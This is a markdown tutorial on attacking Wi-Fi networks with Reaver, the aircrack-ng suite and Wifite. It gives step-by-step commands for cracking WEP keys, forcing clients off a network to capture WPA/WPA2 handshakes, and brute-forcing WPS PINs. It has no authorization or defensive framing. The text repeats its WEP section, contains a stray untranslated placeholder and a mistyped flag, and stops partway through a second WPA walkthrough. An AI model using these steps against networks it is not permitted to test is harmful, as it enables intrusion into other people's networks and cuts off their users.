    # Reaver


    Reaver is a tool specialized in carrying out brute force attacks on the WPS PIN,
    allowing the recovery of the WPA/WPA2 key on networks with WPS enabled.


    ## Attack Examples: WEP, WPA/WPA2 Cracking


    ### Attack on WEP Networks


    Although obsolete, WEP is still found on some networks. A typical attack on a
    WEP network involves the following steps:


    1. Put the interface in monitor mode:

    ```

    airmon-ng start wlan0

    ```


    2. Capture packets:

    ```

    airodump-ng wlan0mon

    ```

    Identify the target network and capture associated packets:

    ```

    airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon

    ```


    3. Inject packets to increase traffic:

    ```

    aireplay-ng --arpreplay - b [BSSID] wlan0mon

    ```


    4. Crack the WEP key:

    ```

    aircrack-ng capture*.cap

    ```


    ### Attack on WPA/WPA2 Networks


    For WPA/WPA2 networks, the goal is to capture a handshake between a client and
    the access point, and then use that handshake to attempt to crack the password.


    1. Put the interface in monitor mode:

    ```

    airmon-ng start wlan0

    ```


    2. Capture the handshake:

    ```

    airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon

    ```

    Leave `airodump-ng` running until it captures a handshake, which can be seen in
    the upper right part of the window.


    3. Force a client to disconnect to capture the handshake:

    ```

    aireplay-ng --deauth 10 -a [BSSID] -c [MAC do cliente] wlan0mon

    ```

    This technique disconnects the client, forcing it to reconnect and thus capture
    the handshake.


    4. Crack WPA/WPA2 key using captured handshake:

    ```

    aircrack-ng -w [password list] -b [BSSID] capture*.cap

    ```


    ### WPS attack with Reaver


    WPS (Wi-Fi Protected Setup) is a feature that aims to make it easier to connect
    devices to Wi-Fi networks. However, it is known for its vulnerabilities, especially
    susceptibility to brute force attacks. Reaver is a popular tool used to exploit
    these vulnerabilities.


    1. Put the interface in monitor mode:

    ```

    airmon-ng start wlan0

    ```


    2. Launch WPS attack:

    ```

    reaver -i wlan0mon -b [BSSID] -vv

    ```

    The above command forces `Reaver` to launch a brute force attack on the WPS PIN,
    trying different combinations until it discovers the correct PIN and, consequently,
    the WPA/WPA2 password.


    # Additional Tools for Wireless Network Analysis


    ### Wireshark


    Wireshark is a widely used packet analysis tool for monitoring and analyzing network
    traffic in real time. It can be used to capture data packets and detect anomalies
    and vulnerabilities in wireless networks.


    ### The kismet


    Kismet is a wireless network detection and sniffer tool. It can detect hidden
    wireless networks, capture data packets and identify connected devices.


    ### Wifite


    Wifite is an automated tool that simplifies the process of attacking Wi-Fi networks.
    It integrates several attack tools, such as `Aircrack-ng` and `Reaver`, and automates
    the steps to carry out WEP, WPA/WPA2 and WPS key cracking attacks. Using `Wifite`,
    you can select targets and launch attacks with simple commands, making the process
    more accessible, especially for beginners.


    #### `wifite`


    When executing the above command, `Wifite` will automatically search for vulnerable
    wireless networks and offer options for specific attacks, simplifying the execution
    of multiple attacks.


    # Attack Examples


    ### Cracking the WEP


    To illustrate a typical attack on a WEP network using `Aircrack-ng`, follow these
    steps:


    1. Start monitor mode:

    ```

    airmon-ng start wlan0

    ```


    2. Identify the target network:

    ```

    airodump-ng wlan0mon

    ```

    Take note of the `BSSID` and channel of the target network.


    3. Capture packets:

    ```

    airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon

    ```


    4. Inject packets:

    ```

    aireplay-ng --arpreplay -b [BSSID] wlan0mon

    ```

    This step increases the amount of traffic, speeding up the process of capturing
    IVs (Initialization Vectors).


    5. Crack the WEP key:

    ```

    aircrack-ng capture*.cap

    ```

    After capturing enough IVs, use `Aircrack-ng` to discover the WEP key.


    ### Cracking de WPA/WPA2


    For WPA/WPA2 networks, the process involves capturing a handshake and then using
    that capture to attempt to crack the password:


    1. Start monitor mode:

    ```

